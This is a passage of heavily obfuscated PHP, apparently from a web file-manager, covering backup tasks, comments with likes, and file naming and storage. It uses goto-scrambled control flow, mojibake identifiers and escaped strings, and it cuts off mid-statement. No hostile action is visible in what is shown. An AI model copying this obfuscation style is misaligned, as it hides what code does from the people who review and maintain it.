$dÀ¡îë…[1872]: $E»îóóÛÜ´ = imagePNG($b–Ã£½ŸèÃ); break; case $dÀ¡îë…[167]: $E»îóóÛÜ´ = imagePNG($b–Ã£½ŸèÃ, $F­á¦ğŸ×); break; } imageDestroy($b–Ã£½ŸèÃ); goto CÇ„ÂÒ†ŸÊ; fš¾¾÷½«Æ: $dÀ¡îë… =& $_SERVER[‚Ğ°–—î]; if (!$b–Ã£½ŸèÃ) { return !1; } ob_get_clean(); goto BÄÆõŒö–‰; CÇ„ÂÒ†ŸÊ: imageDestroy($this->im); return $E»îóóÛÜ´; goto d°‡ùõ±…Ä; d°‡ùõ±…Ä: } } if (!function_exists($_SERVER[‚Ğ°–—î][1873])) { define($_SERVER[‚Ğ°–—î][1874], 0); define($_SERVER[‚Ğ°–—î][1875], 1); define($_SERVER[‚Ğ°–—î][1876], 2); function imageflip($dÁÛêŒµÍ, $bçšæ´ÇÒ÷) { switch ($bçšæ´ÇÒ÷) { case IMG_FLIP_HORIZONTAL: $aäŞÔØ˜ê¡ = imagesx($dÁÛêŒµÍ) - 1; $Cˆã¯´İÂ© = $aäŞÔØ˜ê¡ / 2; $AÌ’‹ÑÕ× = imagesy($dÁÛêŒµÍ); $E”ËØòø¡Ô = imageistruecolor($dÁÛêŒµÍ) ? imagecreatetruecolor(1, $AÌ’‹ÑÕ×) : imagecreate(1, $AÌ’‹ÑÕ×); for ($c‰æ‚‹Úï = 0; $c‰æ‚‹Úï < $Cˆã¯´İÂ©; ++$c‰æ‚‹Úï) { imagecopy($E”ËØòø¡Ô, $dÁÛêŒµÍ, 0, 0, $c‰æ‚‹Úï, 0, 1, $AÌ’‹ÑÕ×); imagecopy($dÁÛêŒµÍ, $dÁÛêŒµÍ, $c‰æ‚‹Úï, 0, $aäŞÔØ˜ê¡ - $c‰æ‚‹Úï, 0, 1, $AÌ’‹ÑÕ×); imagecopy($dÁÛêŒµÍ, $E”ËØòø¡Ô, $aäŞÔØ˜ê¡ - $c‰æ‚‹Úï, 0, 0, 0, 1, $AÌ’‹ÑÕ×); } break; case IMG_FLIP_VERTICAL: $AŠÅ­ö£³ = imagesx($dÁÛêŒµÍ); $aù‚ë—Ìñ = imagesy($dÁÛêŒµÍ) - 1; $då°Ö·É£™ = $aù‚ë—Ìñ / 2; $E”ËØòø¡Ô = imageistruecolor($dÁÛêŒµÍ) ? imagecreatetruecolor($AŠÅ­ö£³, 1) : imagecreate($AŠÅ­ö£³, 1); for ($eŸÊŸÉùñŠ = 0; $eŸÊŸÉùñŠ < $då°Ö·É£™; ++$eŸÊŸÉùñŠ) { imagecopy($E”ËØòø¡Ô, $dÁÛêŒµÍ, 0, 0, 0, $eŸÊŸÉùñŠ, $AŠÅ­ö£³, 1); imagecopy($dÁÛêŒµÍ, $dÁÛêŒµÍ, 0, $eŸÊŸÉùñŠ, 0, $aù‚ë—Ìñ - $eŸÊŸÉùñŠ, $AŠÅ­ö£³, 1); imagecopy($dÁÛêŒµÍ, $E”ËØòø¡Ô, 0, $aù‚ë—Ìñ - $eŸÊŸÉùñŠ, 0, 0, $AŠÅ­ö£³, 1); } break; case IMG_FLIP_BOTH: $AŠÅ­ö£³ = imagesx($dÁÛêŒµÍ); $AÌ’‹ÑÕ× = imagesy($dÁÛêŒµÍ); $E”ËØòø¡Ô = imagerotate($dÁÛêŒµÍ, 180, 0); imagecopy($dÁÛêŒµÍ, $E”ËØòø¡Ô, 0, 0, 0, 0, $AŠÅ­ö£³, $AÌ’‹ÑÕ×); break; default: return; } imagedestroy($E”ËØòø¡Ô); } } goto a„¹¶’ƒ£Î; EËëÂ—Ã‹: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\142\141\143\153\165\x70\114\151\163\x74"; public $field = array("\x69\x6f", "\156\x61\x6d\145", "\163\164\x61\x74\165\163", "\143\157\x6e\164\145\x6e\x74", "\x72\x65\163\x75\x6c\164", "\x74\151\155\x65\x46\x72\x6f\x6d", "\x74\x69\155\x65\124\157"); public function config() { goto eğçÁƒÓ; AÛàİÑÍŒê: if (isset($d©ïôËİŒ‡[$fãµ•ƒ×ì…[190]])) { $d©ïôËİŒ‡[$fãµ•ƒ×ì…[190]] = json_decode($d©ïôËİŒ‡[$fãµ•ƒ×ì…[190]], !0); } if (isset($D§»Ä‹®¢œ[$fãµ•ƒ×ì…[190]])) { $d©ïôËİŒ‡[$fãµ•ƒ×ì…[190]][$fãµ•ƒ×ì…[1413]] = $D§»Ä‹®¢œ[$fãµ•ƒ×ì…[190]]; unset($D§»Ä‹®¢œ[$fãµ•ƒ×ì…[190]]); } return array_merge($d©ïôËİŒ‡, $D§»Ä‹®¢œ); goto bÔ•‹ãÂ˜»; f¦ï¡‚¸»: $D§»Ä‹®¢œ = is_array($D§»Ä‹®¢œ) ? $D§»Ä‹®¢œ : array(); if (!isset($D§»Ä‹®¢œ[$fãµ•ƒ×ì…[691]])) { $D§»Ä‹®¢œ[$fãµ•ƒ×ì…[691]] = $fãµ•ƒ×ì…[468]; } $d©ïôËİŒ‡ = array(); goto C¢ïÑ„³›â; eğçÁƒÓ: $fãµ•ƒ×ì… =& $_SERVER[‚Ğ°–—î]; $D§»Ä‹®¢œ = Model($fãµ•ƒ×ì…[1089])->get($fãµ•ƒ×ì…[713]); $D§»Ä‹®¢œ = json_decode($D§»Ä‹®¢œ, !0); goto f¦ï¡‚¸»; C¢ïÑ„³›â: Action($fãµ•ƒ×ì…[2129])->taskInit(); $d¾öˆ˜¶Šñ = Model($fãµ•ƒ×ì…[2130])->listData(); foreach ($d¾öˆ˜¶Šñ as $e±£¢ˆ¯ßé) { if ($e±£¢ˆ¯ßé[$fãµ•ƒ×ì…[1081]] == $fãµ•ƒ×ì…[83] && $e±£¢ˆ¯ßé[$fãµ•ƒ×ì…[1426]] == $fãµ•ƒ×ì…[2131]) { $d©ïôËİŒ‡ = $e±£¢ˆ¯ßé; break; } } goto AÛàİÑÍŒê; bÔ•‹ãÂ˜»: } public function listData($b¬áË‹š = false, $bŒ“œ¨‚ë = "\155\x6f\x64\x69\146\x79\x54\151\x6d\x65", $Bô’Éëõ§ = false) { return parent::listData($b¬áË‹š, $bŒ“œ¨‚ë, !0); } public function lastItem() { $CœßØãƒ×š = $this->listData(); return !empty($CœßØãƒ×š[0]) ? $CœßØãƒ×š[0] : null; } public function kill($C’®Œîá–ß) { goto fÂ½¾“Ë¨‘; fÂ½¾“Ë¨‘: $dã±‘ ¼Ê =& $_SERVER[‚Ğ°–—î]; $Cİ¦õ‰ŠÂ‹ = $this->listData($C’®Œîá–ß); if (!$Cİ¦õ‰ŠÂ‹ || empty($Cİ¦õ‰ŠÂ‹[$dã±‘ ¼Ê[28]])) { return !0; } goto cĞ›å¡Ó‚; cĞ›å¡Ó‚: Task::kill($dã±‘ ¼Ê[712]); Task::kill($dã±‘ ¼Ê[728]); Task::kill($dã±‘ ¼Ê[736]); goto B…¶•©Á¨É; B…¶•©Á¨É: $DÔ ÓÀì½Š = $Cİ¦õ‰ŠÂ‹[$dã±‘ ¼Ê[28]]; $b—˜ Ìµß = TEMP_FILES . $dã±‘ ¼Ê[709] . $DÔ ÓÀì½Š . $dã±‘ ¼Ê[8]; IO::remove($b—˜ Ìµß, !1); goto A¿¢±‘ÕÖˆ; A¿¢±‘ÕÖˆ: return $this->remove($C’®Œîá–ß); goto fî’© İëÅ; fî’© İëÅ: } public function remove($f–…Í¸Ë¢î) { $bÜÅ¥™Ö¹¹ = $this->listData($f–…Í¸Ë¢î); if (!$bÜÅ¥™Ö¹¹) { return !0; } return $this->backupRemove($bÜÅ¥™Ö¹¹); } private function backupRemove($dÅÎÒ¯ò¢Ş) { $BÕœ«ß«­ =& $_SERVER[‚Ğ°–—î]; parent::remove($dÅÎÒ¯ò¢Ş[$BÕœ«ß«­[367]]); $a„æö‘¨à¡ = "\x7b\151\x6f\x3a{$dÅÎÒ¯ò¢Ş[$BÕœ«ß«­[690]]}\175\x2f\x64\141\x74\141\x62\x61\x73\145\x2f\142\x61\143\x6b\165\x70\x5f" . $dÅÎÒ¯ò¢Ş[$BÕœ«ß«­[28]]; IO::remove($a„æö‘¨à¡, !1); return !0; } public function start() { goto BÀÑêÏÁ‘Ñ; CØ©±æÄ›®: if (!$F¡›•¾öÍ || $F¡›•¾öÍ[$eĞÇƒĞ¹åĞ[1410]] != $eĞÇƒĞ¹åĞ[83]) { return !1; } $dÊ‘˜èàµ× = $this->process(); foreach ($dÊ‘˜èàµ× as $f¡ßß‡Ù) { if ($f¡ßß‡Ù) { return Task::restart($f¡ßß‡Ù[$eĞÇƒĞ¹åĞ[367]]); } } goto A¬¥„Å‡; FÀõ«Éœ÷: return !0; goto dç¥ùëë¹œ; d›ëÍã—¸Ë: if (!$a‚²é™Ü»->dbFile()) { return !1; } if ($F¡›•¾öÍ[$eĞÇƒĞ¹åĞ[691]] == $eĞÇƒĞ¹åĞ[468]) { $a‚²é™Ü»->file(); } Backup::set(array($eĞÇƒĞ¹åĞ[688] => 1, $eĞÇƒĞ¹åĞ[702] => time())); goto FÀõ«Éœ÷; A¬¥„Å‡: $a‚²é™Ü» = new Backup(); $a‚²é™Ü»->keep(); if (!$a‚²é™Ü»->db()) { return !1; } goto d›ëÍã—¸Ë; BÀÑêÏÁ‘Ñ: $eĞÇƒĞ¹åĞ =& $_SERVER[‚Ğ°–—î]; if ($GLOBALS[$eĞÇƒĞ¹åĞ[6]][$eĞÇƒĞ¹åĞ[84]][$eĞÇƒĞ¹åĞ[2132]] != $eĞÇƒĞ¹åĞ[83]) { return !0; } $F¡›•¾öÍ = $this->config(); goto CØ©±æÄ›®; dç¥ùëë¹œ: } public function process() { $AÜéë‡±›‡ =& $_SERVER[‚Ğ°–—î]; return array($AÜéë‡±›‡[693] => Task::get($AÜéë‡±›‡[712]), $AÜéë‡±›‡[696] => Task::get($AÜéë‡±›‡[728]), $AÜéë‡±›‡[167] => Task::get($AÜéë‡±›‡[736])); } public function restore() { $F˜×ë“Çä© =& $_SERVER[‚Ğ°–—î]; ActionCall($F˜×ë“Çä©[2133], !0, 1); ActionCall($F˜×ë“Çä©[2133], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\141\155\145" => "\143\157\x6d\155\x65\156\164\x5f\x6d\145\164\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\x64" => "\x63\x6f\155\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aÇ‰ÚáŞã) { $d§¥„³áŒ¡ =& $_SERVER[‚Ğ°–—î]; if ($aÇ‰ÚáŞã[$d§¥„³áŒ¡[2134]]) { $CÒÌÂÄ‰ÇÃ = $this->where(array($d§¥„³áŒ¡[2135] => $aÇ‰ÚáŞã[$d§¥„³áŒ¡[2134]]))->find(); if (!$CÒÌÂÄ‰ÇÃ || $CÒÌÂÄ‰ÇÃ[$d§¥„³áŒ¡[371]] != $aÇ‰ÚáŞã[$d§¥„³áŒ¡[371]] || $CÒÌÂÄ‰ÇÃ[$d§¥„³áŒ¡[456]] != $aÇ‰ÚáŞã[$d§¥„³áŒ¡[456]]) { return !1; } $this->where(array($d§¥„³áŒ¡[2135] => $aÇ‰ÚáŞã[$d§¥„³áŒ¡[2134]]))->setAdd($d§¥„³áŒ¡[2136], 1); } return $this->add($aÇ‰ÚáŞã); } public function remove($dšÙä³„¾„) { $FÚæƒÂ´­ =& $_SERVER[‚Ğ°–—î]; $dƒäÛ©ğ¡¢ = array($FÚæƒÂ´­[2135] => $dšÙä³„¾„); $f§¡‡Ù§‘ç = $this->where($dƒäÛ©ğ¡¢)->find(); if ($f§¡‡Ù§‘ç[$FÚæƒÂ´­[2134]]) { $this->where(array($FÚæƒÂ´­[2135] => $f§¡‡Ù§‘ç[$FÚæƒÂ´­[2134]]))->setAdd($FÚæƒÂ´­[2136], -1); } return $this->where($dƒäÛ©ğ¡¢)->delete(); } public function edit($AÎì¼ì¾©, $c—ÃÓ¡êø) { $D×šÑ«ºÈ™ =& $_SERVER[‚Ğ°–—î]; $EœšõÂğï = array($D×šÑ«ºÈ™[2135] => $AÎì¼ì¾©); return $this->where($EœšõÂğï)->save(array($D×šÑ«ºÈ™[2137] => $c—ÃÓ¡êø)); } public function prasise($Cé·òØ‡¾«) { $aóƒ¢ÊÛ¯É =& $_SERVER[‚Ğ°–—î]; $fˆö¨ËòİÓ = Model($aóƒ¢ÊÛ¯É[2138]); $C®Ò”¹¦ëÕ = array($aóƒ¢ÊÛ¯É[2135] => $Cé·òØ‡¾«, $aóƒ¢ÊÛ¯É[1429] => USER_ID); $E« µ»õ“ = $fˆö¨ËòİÓ->where($C®Ò”¹¦ëÕ)->find(); if (!$E« µ»õ“) { $fˆö¨ËòİÓ->add($C®Ò”¹¦ëÕ); $eéÀˆÒµÈŒ = $this->where(array($aóƒ¢ÊÛ¯É[2135] => $Cé·òØ‡¾«))->setAdd($aóƒ¢ÊÛ¯É[2139], 1); } else { $fˆö¨ËòİÓ->where($C®Ò”¹¦ëÕ)->delete(); $eéÀˆÒµÈŒ = $this->where(array($aóƒ¢ÊÛ¯É[2135] => $Cé·òØ‡¾«))->setAdd($aóƒ¢ÊÛ¯É[2139], -1); } return $eéÀˆÒµÈŒ; } public function targetInfo($FõĞÌ¯–·ç, $dáÀ‘ˆŸË¯) { goto D¢ù‡Û´“Ë; a˜ÓÒ™‚·: $EÑÂÙ§²¸à = "\x52\111\x47\x48\124\x20\x4a\117\x49\116\40{$this->tablePrefix}\143\x6f\155\x6d\x65\156\x74\x5f\160\162\x61\x69\x73\145\x20\x73\x74\141\x72\40\x6f\x6e\x20\x63\157\155\x6d\145\x6e\x74\56\143\x6f\x6d\155\145\x6e\164\111\104\40\75\x20\163\164\x61\162\56\x63\x6f\155\x6d\145\x6e\x74\111\x44"; $eËäĞ¨Ş½¬ = $this->alias($DÉ»ÆÅ[341])->where($b¢Ç²È×á)->join($EÑÂÙ§²¸à, $DÉ»ÆÅ[2140])->count(); $f½ôİ œò½ = array($DÉ»ÆÅ[2141] => $D†Š³•ÚÕİ, $DÉ»ÆÅ[2142] => $eËäĞ¨Ş½¬); goto e¨åŞ‘±ßé; e¨åŞ‘±ßé: return $f½ôİ œò½; goto DÆ®´»Î»†; D¢ù‡Û´“Ë: $DÉ»ÆÅ =& $_SERVER[‚Ğ°–—î]; $b¢Ç²È×á = array($DÉ»ÆÅ[521] => $FõĞÌ¯–·ç, $DÉ»ÆÅ[522] => $dáÀ‘ˆŸË¯); $D†Š³•ÚÕİ = $this->where($b¢Ç²È×á)->count(); goto a˜ÓÒ™‚·; DÆ®´»Î»†: } public function listData($DĞÇ›Â­Û¸) { $Bï¨Š»ôƒÓ =& $_SERVER[‚Ğ°–—î]; if (isset($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2143]])) { if ($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2143]]) { $DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2144]] = array($Bï¨Š»ôƒÓ[929], intval($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2143]])); } unset($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2143]]); } if (isset($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2145]])) { if ($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2145]]) { $DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2144]] = array($Bï¨Š»ôƒÓ[926], intval($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2145]])); } unset($DĞÇ›Â­Û¸[$Bï¨Š»ôƒÓ[2145]]); } return $this->_listData($DĞÇ›Â­Û¸); } private function _listData($bÖ–‡„¸½») { $E·å‹Ù¤İ =& $_SERVER[‚Ğ°–—î]; $D¹µ¤º°†Ë = $this->where($bÖ–‡„¸½»)->_makeOrder()->selectPage(100); $this->_listAppendParent($D¹µ¤º°†Ë[$E·å‹Ù¤İ[354]]); $this->_listAppendUser($D¹µ¤º°†Ë[$E·å‹Ù¤İ[354]]); $this->_listAppendMeta($D¹µ¤º°†Ë[$E·å‹Ù¤İ[354]]); return $D¹µ¤º°†Ë; } private function _makeOrder() { $b´æ¼Ş™ˆö =& $_SERVER[‚Ğ°–—î]; $Cã‹¼Ô·½â = array($b´æ¼Ş™ˆö[2139], $b´æ¼Ş™ˆö[2136], $b´æ¼Ş™ˆö[187]); $eµ»©‚ø±˜ = Input::get($b´æ¼Ş™ˆö[407], $b´æ¼Ş™ˆö[7], $b´æ¼Ş™ˆö[389], $Cã‹¼Ô·½â); $d‘ã¥—Ğ×Œ = Input::get($b´æ¼Ş™ˆö[408], $b´æ¼Ş™ˆö[7], $b´æ¼Ş™ˆö[1431], array($b´æ¼Ş™ˆö[2146], $b´æ¼Ş™ˆö[405])); $FêôìºÍ” = $eµ»©‚ø±˜ . $b´æ¼Ş™ˆö[50] . $d‘ã¥—Ğ×Œ; return $this->order($FêôìºÍ”); } private function _listAppendParent(&$a÷¨¿¤®å) { goto C…™éÆ¦çÎ; C…™éÆ¦çÎ: $a“ƒÆ«ò„ =& $_SERVER[‚Ğ°–—î]; $fÈØÆÈğã› = array_unique(array_to_keyvalue($a÷¨¿¤®å, $a“ƒÆ«ò„[33], $a“ƒÆ«ò„[2134])); $fÈØÆÈğã› = array_remove_value($fÈØÆÈğã›, $a“ƒÆ«ò„[468]); goto CÖæçÛÑ¤‚; c»ï‹ÄÔ´±: foreach ($a÷¨¿¤®å as &$DÑŠâÌ³“) { if (isset($dÏŠÈÒœªˆ[$DÑŠâÌ³“[$a“ƒÆ«ò„[2134]]])) { $DÑŠâÌ³“[$a“ƒÆ«ò„[2147]] = $dÏŠÈÒœªˆ[$DÑŠâÌ³“[$a“ƒÆ«ò„[2134]]]; } } goto døØ–å‘³Ş; CÖæçÛÑ¤‚: if (!$fÈØÆÈğã›) { return; } $dÏŠÈÒœªˆ = $this->where(array($a“ƒÆ«ò„[2135] => array($a“ƒÆ«ò„[7], $fÈØÆÈğã›)))->select(); $dÏŠÈÒœªˆ = array_to_keyvalue($dÏŠÈÒœªˆ, $a“ƒÆ«ò„[2144]); goto c»ï‹ÄÔ´±; døØ–å‘³Ş: } private function _listAppendUser(&$EÖÄ…‘òÊ®) { goto e½÷ŒÑô•”; F—æÒã†İ: if (count($b¿ˆ­†Íª) == 0) { return; } foreach ($EÖÄ…‘òÊ® as $EÕßƒŠä¸î) { if (isset($EÕßƒŠä¸î[$dÍ·¥¸·Õ‰[2147]])) { $b¿ˆ­†Íª[] = $EÕßƒŠä¸î[$dÍ·¥¸·Õ‰[2147]][$dÍ·¥¸·Õ‰[1438]]; } } $b¦Ğ¡İğ¥• = Model($dÍ·¥¸·Õ‰[477])->userListInfo($b¿ˆ­†Íª); goto c²ùÊ‰ÏÈÛ; c²ùÊ‰ÏÈÛ: foreach ($EÖÄ…‘òÊ® as &$EÕßƒŠä¸î) { $EÕßƒŠä¸î[$dÍ·¥¸·Õ‰[535]] = $b¦Ğ¡İğ¥•[$EÕßƒŠä¸î[$dÍ·¥¸·Õ‰[1438]]]; if (isset($EÕßƒŠä¸î[$dÍ·¥¸·Õ‰[2147]])) { $EÕßƒŠä¸î[$dÍ·¥¸·Õ‰[2147]][$dÍ·¥¸·Õ‰[535]] = $b¦Ğ¡İğ¥•[$EÕßƒŠä¸î[$dÍ·¥¸·Õ‰[2147]][$dÍ·¥¸·Õ‰[1438]]]; } } goto F¬¥åÊåÍ; e½÷ŒÑô•”: $dÍ·¥¸·Õ‰ =& $_SERVER[‚Ğ°–—î]; $b¿ˆ­†Íª = array_unique(array_to_keyvalue($EÖÄ…‘òÊ®, $dÍ·¥¸·Õ‰[33], $dÍ·¥¸·Õ‰[1438])); $b¿ˆ­†Íª = array_remove_value($b¿ˆ­†Íª, $dÍ·¥¸·Õ‰[468]); goto F—æÒã†İ; F¬¥åÊåÍ: } private function _listAppendMeta(&$c¿èÚ”Òß) { goto dÙõ´º«; Cêš„Š—ºÆ: if (!$AÑïŞƒ˜Â) { return !1; } foreach ($c¿èÚ”Òß as &$e†Û‚á¶Â‘) { $e†Û‚á¶Â‘[$A£”Ö¹œ½ô[417]] = $AÑïŞƒ˜Â[$e†Û‚á¶Â‘[$A£”Ö¹œ½ô[2144]]]; if (isset($e†Û‚á¶Â‘[$A£”Ö¹œ½ô[2147]])) { $e†Û‚á¶Â‘[$A£”Ö¹œ½ô[2147]][$A£”Ö¹œ½ô[417]] = $AÑïŞƒ˜Â[$e†Û‚á¶Â‘[$A£”Ö¹œ½ô[2147]][$A£”Ö¹œ½ô[2144]]]; } } goto FîÛÙ†õÇ; D¢¹ÉÆÈ…ø: if (!$f¹·Ÿ‘ÍÔá) { return; } foreach ($c¿èÚ”Òß as $e†Û‚á¶Â‘) { if (isset($e†Û‚á¶Â‘[$A£”Ö¹œ½ô[2147]])) { $f¹·Ÿ‘ÍÔá[] = $e†Û‚á¶Â‘[$A£”Ö¹œ½ô[2147]][$A£”Ö¹œ½ô[2144]]; } } $AÑïŞƒ˜Â = $this->metaList($f¹·Ÿ‘ÍÔá); goto Cêš„Š—ºÆ; dÙõ´º«: $A£”Ö¹œ½ô =& $_SERVER[‚Ğ°–—î]; $f¹·Ÿ‘ÍÔá = array_unique(array_to_keyvalue($c¿èÚ”Òß, $A£”Ö¹œ½ô[33], $A£”Ö¹œ½ô[2144])); $f¹·Ÿ‘ÍÔá = array_remove_value($f¹·Ÿ‘ÍÔá, $A£”Ö¹œ½ô[468]); goto D¢¹ÉÆÈ…ø; FîÛÙ†õÇ: } private function metaList($FäãÒÖ¶§à) { goto D¬¬àÂ£±½; cµÎİ¡…: return $a¾Ù¡­áÇ ? $a¾Ù¡­áÇ : array(); goto A‡¸»¯…ì; D¬¬àÂ£±½: $DÜ‘Îëå•‰ =& $_SERVER[‚Ğ°–—î]; if (!$FäãÒÖ¶§à) { return array(); } $D©¼Ò¥‡ĞŠ = array($DÜ‘Îëå•‰[2144] => array($DÜ‘Îëå•‰[7], $FäãÒÖ¶§à)); goto dÃŠ±Íˆ†; dÃŠ±Íˆ†: $a¾Ù¡­áÇ = Model($DÜ‘Îëå•‰[2148])->where($D©¼Ò¥‡ĞŠ)->select(); $a¾Ù¡­áÇ = array_to_keyvalue_group($a¾Ù¡­áÇ, $DÜ‘Îëå•‰[2144]); foreach ($a¾Ù¡­áÇ as $C„ˆÌÔéó¹ => $cÙ³ŞìºöĞ) { $d¨êÄäíä  = array(); foreach ($cÙ³ŞìºöĞ as $dî´§İçóÒ) { $d¨êÄäíä [$dî´§İçóÒ[$DÜ‘Îëå•‰[89]]] = $dî´§İçóÒ[$DÜ‘Îëå•‰[359]]; } $a¾Ù¡­áÇ[$C„ˆÌÔéó¹] = $d¨êÄäíä ; } goto cµÎİ¡…; A‡¸»¯…ì: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\x6d\145" => "\x69\157\137\146\151\x6c\145\137\155\x65\164\141", "\155\145\164\141\x46\x69\x65\x6c\144" => "\x66\151\154\145\x49\x44"); public function fileInfo($Aë‹‹ƒæï) { $FĞ… ç¦ä =& $_SERVER[‚Ğ°–—î]; static $cç–Šß = array(); if (!isset($cç–Šß[$Aë‹‹ƒæï])) { $d œí÷õ¼µ = $FĞ… ç¦ä[2149]; $E¿¦ÃÇˆÆ¸ = Model($FĞ… ç¦ä[422])->field($d œí÷õ¼µ)->where(array($FĞ… ç¦ä[420] => $Aë‹‹ƒæï))->find(); $cç–Šß[$Aë‹‹ƒæï] = $E¿¦ÃÇˆÆ¸; } return $cç–Šß[$Aë‹‹ƒæï]; } public function addFileByContent($D÷¬¢‚†† = '', $dš†èé—‡ = '') { goto AÃ»“¤°í; EØôÓ‘ïÍÑ: if (file_exists($Aæ±­†¶ò®)) { @unlink($Aæ±­†¶ò®); } return $cÎŒâìÆâ; goto fåíåêœÏª; AÃ»“¤°í: $d‡ôø¹… =& $_SERVER[‚Ğ°–—î]; $eŞ¸æÉ¡— = TEMP_PATH . $d‡ôø¹…[2150]; if (!is_dir($eŞ¸æÉ¡—)) { mk_dir($eŞ¸æÉ¡—); } goto c®âŠ¨­ ; c®âŠ¨­ : $Aæ±­†¶ò® = $eŞ¸æÉ¡— . $d‡ôø¹…[2151] . rand_string(16); file_put_contents($Aæ±­†¶ò®, $D÷¬¢‚††); $cÎŒâìÆâ = $this->addFile($Aæ±­†¶ò®, $dš†èé—‡, !0); goto EØôÓ‘ïÍÑ; fåíåêœÏª: } public function createFileName($EšŠ˜‘ÁÍ) { goto cÒ¬­íÊ‰; FÉÆ¿†°šŠ: if (!$bÀš²¨ğÒ× && !Cache::get($eñÃÉ¾Ü¸)) { $bÀš²¨ğÒ× = !0; $bù‚Ô˜ÍŒİ = IO::mkdir($cÇÁŞöµ¬); if (!IO::exist($bù‚Ô˜ÍŒİ . $CİŠğ¡ëâî[2153])) { IO::mkfile($bù‚Ô˜ÍŒİ . $CİŠğ¡ëâî[2153]); } Cache::set($eñÃÉ¾Ü¸, 1, 3600 * 2); } return $d”«á’¶ö×; goto E–¾•ÁÔ¡º; cÒ¬­íÊ‰: $CİŠğ¡ëâî =& $_SERVER[‚Ğ°–—î]; $FòÌ·…õ›Ø = IO::init($CİŠğ¡ëâî[8]); $d”«á’¶ö× = $this->makeFilePath($EšŠ˜‘ÁÍ, $FòÌ·…õ›Ø); goto f†–Ñ›£ŒË; f†–Ñ›£ŒË: $cÇÁŞöµ¬ = $FòÌ·…õ›Ø->pathFather($d”«á’¶ö×); static $bÀš²¨ğÒ× = false; $eñÃÉ¾Ü¸ = $CİŠğ¡ëâî[2152] . md5($cÇÁŞöµ¬); goto FÉÆ¿†°šŠ; E–¾•ÁÔ¡º: } public function makeFilePath($E†Ñó¸òí¤, $BÛ¥‚‚Œ) { goto AàÙ×ğñ·ï; dËøôïã‹’: switch ($F²Øì†Å¶) { case $e‹Öã®ÂÉá[2157]: $dàÖåà´‘š = $dàÖåà´‘š . $e‹Öã®ÂÉá[91] . $BÛ¥‚‚Œ->ext($E†Ñó¸òí¤); if ($BÛ¥‚‚Œ->ext($E†Ñó¸òí¤) == $e‹Öã®ÂÉá[2097]) { $dàÖåà´‘š .= $e‹Öã®ÂÉá[2158]; } break; case $e‹Öã®ÂÉá[2159]: goto EœÀòÂ™®; e›‚Ã³ªšÏ: if ($BÛ¥‚‚Œ->ext($E†Ñó¸òí¤) == $e‹Öã®ÂÉá[2097]) { $E†Ñó¸òí¤ .= $e‹Öã®ÂÉá[2158]; } $CË™›ã±ƒÕ = IO::fileNameAuto($f¨Ó½¿µí›, $E†Ñó¸òí¤); $dàÖåà´‘š = $f¨Ó½¿µí› . $CË™›ã±ƒÕ; goto Fìó†­½—œ; Fìó†­½—œ: break; goto Fçö±ŞÎ¦»; EœÀòÂ™®: $E¾Ğ‡–Æ¾” = Model($e‹Öã®ÂÉá[1089])->get($e‹Öã®ÂÉá[1337]); $aÔ´Èâ¡º = substr(md5($e‹Öã®ÂÉá[1915] . $E¾Ğ‡–Æ¾” . date($e‹Öã®ÂÉá[686])), 0, 8); $f¨Ó½¿µí› = KodIO::defaultIO() . date($e‹Öã®ÂÉá[2160]) . $aÔ´Èâ¡º . $e‹Öã®ÂÉá[8]; goto e›‚Ã³ªšÏ; Fçö±ŞÎ¦»: case $e‹Öã®ÂÉá[2156]: break; default: break; } return $dàÖåà´‘š; goto eÓËÕÚà¥»; AàÙ×ğñ·ï: $e‹Öã®ÂÉá =& $_SERVER[‚Ğ°–—î]; $F²Øì†Å¶ = Model($e‹Öã®ÂÉá[1089])->get($e‹Öã®ÂÉá[2154]); $f¨Ó½¿µí› = KodIO::defaultIO() . date($e‹Öã®ÂÉá[2155]); goto FÃ‚ì¥„©; FÃ‚ì¥„©: $dàÖåà´‘š = $f¨Ó½¿µí› . rand_string(5) . short_id(100); $E†Ñó¸òí¤ = str_replace($e‹Öã®ÂÉá[8], $e‹Öã®ÂÉá[70], KodIO::clear($E†Ñó¸òí¤)); if (!$E†Ñó¸òí¤) { $F²Øì†Å¶ = $e‹Öã®ÂÉá[2156]; } goto dËøôïã‹’; eÓËÕÚà¥»: } public function addFileByRemote($d²Úãç‘œÀ, $DÃ³„®‚öÅ, $EáÕÓÊ´È• = array()) { goto a•¤µÒÆ¿«; a•¤µÒÆ¿«: $c¥µâÉ“†‹ =& $_SERVER[‚Ğ°–—î]; if (!IO::exist($d²Úãç‘œÀ)) { return !1; } $eÕ¬ï’­³Ò = $EáÕÓÊ´È•[$c¥µâÉ“†‹[163]] ? $EáÕÓÊ´È•[$c¥µâÉ“†‹[163]] : $c¥µâÉ“†‹[33]; goto Aô¸Š—¾­‰; Aô¸Š—¾­‰: $fÌË”Ü—°á = IO::hashMd5($d²Úãç‘œÀ, $eÕ¬ï’­³Ò); $d³ñéŠŞÜ¯ = KodIO::defaultDriver(); $fÜÎ¦Š¯ ± = array($c¥µâÉ“†‹[520] => IO::size($d²Úãç‘œÀ), $c¥µâÉ“†‹[2161] => 1, $c¥µâÉ“†‹[386] => $DÃ³„®‚öÅ, $c¥µâÉ“†‹[735] => $d³ñéŠŞÜ¯[$c¥µâÉ“†‹[367]], $c¥µâÉ“†‹[387] => $d²Úãç‘œÀ, $c¥µâÉ“†‹[2162] => 